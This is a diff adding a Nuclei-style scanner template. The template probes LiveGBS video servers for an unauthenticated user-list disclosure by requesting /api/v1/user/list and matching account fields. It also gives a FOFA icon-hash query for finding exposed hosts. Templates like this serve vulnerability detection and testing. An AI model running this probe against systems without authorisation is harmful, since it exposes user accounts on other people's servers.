@@ -1,0 +1,27 @@
+id: livegbs-userlist-disclosure
+info:
+  name: LiveGBS userlist - 敏感信息泄漏
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - todo
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="-206100324"
+  tags: livegbs,disclosure
+
+
+http:
+  - raw:
+      - |
+        GET /api/v1/user/list?q=&start=&limit=10&enable=&sort=CreatedAt&order=desc HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - contains_all(body,'Username','Role','Enable','HasAllChannel','CreatedAt','UpdatedAt')
+        condition: and
